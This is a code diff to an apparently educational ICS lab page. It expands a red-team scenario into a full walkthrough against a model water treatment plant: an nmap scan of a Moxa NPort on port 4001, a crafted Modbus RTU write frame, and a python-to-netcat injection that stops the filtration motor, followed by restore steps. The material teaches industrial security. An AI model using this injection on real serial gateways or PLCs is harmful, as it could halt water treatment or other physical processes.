@@ -1578,49 +1578,118 @@ HARDENING CHECKLIST
 const waterTreatmentScenarios = {
   red: {
     kicker: "Red Team Scenario",
-    title: "Water Treatment Moxa Modbus RTU Attack Surface",
-    summary: "Students simulate an authorized lab-only Modbus RTU-over-TCP command injection path against the Water Treatment model and observe filtration or recycle pump behavior on the dashboard.",
-    badges: ["Moxa NPort", "Modbus RTU over TCP", "Port 4001", "Water Treatment"],
+    title: "Water Treatment Plant - Modbus RTU Attack",
+    summary: "Students follow an authorized lab-only walkthrough against the Water Treatment model where an exposed Moxa NPort serial gateway forwards raw Modbus RTU bytes over TCP and can stop the filtration motor.",
+    badges: ["Moxa NPort", "Modbus RTU", "TCP/4001", "No Auth"],
     steps: [
-      "Open the Water Treatment dashboard and use the approved dashboard controls to start the physical model.",
-      "Identify the Moxa NPort device in the Water Treatment network and confirm the approved lab target IP.",
-      "Confirm that TCP port 4001 is reachable on the Moxa device.",
-      "Use the approved Modbus RTU HEX command generated for the lab to send a command through netcat.",
-      "Observe the dashboard and physical model for filter or pump state changes.",
-      "Restore the model using the approved dashboard controls before ending the drill."
+      "Reconnaissance: scan the approved Moxa target and confirm TCP/4001 is open with the newoak service.",
+      "Understand the device path: TCP traffic reaches the Moxa NPort, then bridges directly to the Modbus RTU serial bus.",
+      "Craft the Modbus RTU Write Single Register frame for slave 01, register 0000, value 014D, and CRC 486F.",
+      "Inject the raw payload with python3 bytes.fromhex piped into netcat.",
+      "Observe the filtration wheels stopping, motor state changing to OFF, and the dashboard flag appearing.",
+      "Restore safe state from the dashboard using START FILTRATION and START PUMP."
     ],
-    actionTitle: "Moxa Lab Commands",
+    actionTitle: "Full Walkthrough",
     commands: `==============================
-ENUMERATION
+PHASE 1 - RECONNAISSANCE
 ==============================
-Approved lab target:
-  MOXA_IP=172.16.17.133
-  MOXA_PORT=4001
+nmap -p 4001 172.16.17.133
 
-Confirm the Moxa serial gateway port is reachable:
-  nmap -p 4001 $MOXA_IP
+Output:
+PORT     STATE SERVICE
+4001/tcp open  newoak
+MAC Address: 00:90:E8:4F:EF:4D (Moxa Technologies)
 
-Student task:
-  Identify the Moxa gateway and confirm the Modbus RTU-over-TCP path.
-
-
-==============================
-COMMAND INJECTION SIMULATION
-==============================
-Lab example: generated Modbus RTU command used to stop filtration:
-  python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('01100000000102014D67F5'))" | nc $MOXA_IP $MOXA_PORT
-
-Student task:
-  Observe filtration or pump behavior on the dashboard and physical model.
+What you learn:
+- Port 4001 is open
+- Service name is newoak
+- Device is a Moxa NPort serial-to-ethernet converter
+- No authentication is required
 
 
 ==============================
-RESTORE SAFE STATE
+PHASE 2 - UNDERSTAND THE DEVICE
 ==============================
-Use the approved dashboard controls to restart filtration and pump operation.
+Moxa NPort is a serial device server. It bridges:
+  Attacker TCP connection
+    -> Moxa NPort 172.16.17.133:4001
+    -> Modbus RTU serial bus
+    -> PLC controlling water treatment
+
+Key facts:
+- No handshake needed
+- No credentials needed
+- Raw bytes sent over TCP go directly to the PLC
+- Protocol is Modbus RTU, not Modbus TCP, so there is no MBAP header
+
+
+==============================
+PHASE 3 - CRAFT THE PAYLOAD
+==============================
+Modbus RTU frame structure for Write Single Register, FC06:
+Byte 1    -> Slave ID          = 01
+Byte 2    -> Function Code     = 06  (Write Single Register)
+Byte 3-4  -> Register Address  = 00 00  (register 0 = filtration)
+Byte 5-6  -> Value             = 01 4D  (decimal 333 = stop)
+Byte 7-8  -> CRC16 checksum    = 48 6F
+
+Full payload:
+  01 06 00 00 01 4D 48 6F
+
+Hex string:
+  01060000014D486F
+
+
+==============================
+PHASE 4 - INJECT THE PAYLOAD
+==============================
+python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('01060000014D486F'))" | nc -w 1 172.16.17.133 4001
+
+Command breakdown:
+python3 -c "..."          -> run Python inline
+bytes.fromhex('...')      -> convert hex string to raw bytes
+sys.stdout.buffer.write() -> write raw bytes to stdout
+| nc -w 1                 -> pipe into netcat and close after 1 second
+172.16.17.133             -> Moxa NPort IP
+4001                      -> Moxa serial bridge port
+
+
+==============================
+PHASE 5 - OBSERVE IMPACT
+==============================
+Before injection:
+  Filtration wheels -> spinning
+  Pump              -> running
+  TDS               -> reading values
+  Status            -> active
+
+After injection:
+  Filtration wheels -> STOPPED
+  Motor             -> OFF
+  Flag              -> appears on dashboard
+
+
+==============================
+PHASE 6 - RESTORE SAFE STATE
+==============================
+Go to the dashboard and click:
+  START FILTRATION
+  START PUMP
 
 Safety note:
-  Run only approved HEX commands for this lab and restore the model from the dashboard after testing.`,
+  Restore the physical model for the next team before ending the drill.
+
+
+==============================
+FULL ATTACK CHAIN SUMMARY
+==============================
+nmap -p 4001 172.16.17.133
+  -> Port 4001 open, Moxa NPort identified
+  -> No auth, raw TCP injection possible
+  -> Modbus RTU frame crafted: 01 06 00 00 01 4D 48 6F
+  -> python3 bytes.fromhex piped into nc -w 1 172.16.17.133 4001
+  -> Filtration motor stopped
+  -> FLAG captured`,
     links: [
       { label: "Open Water Treatment Dashboard", href: waterTreatmentDashboardUrl }
     ]
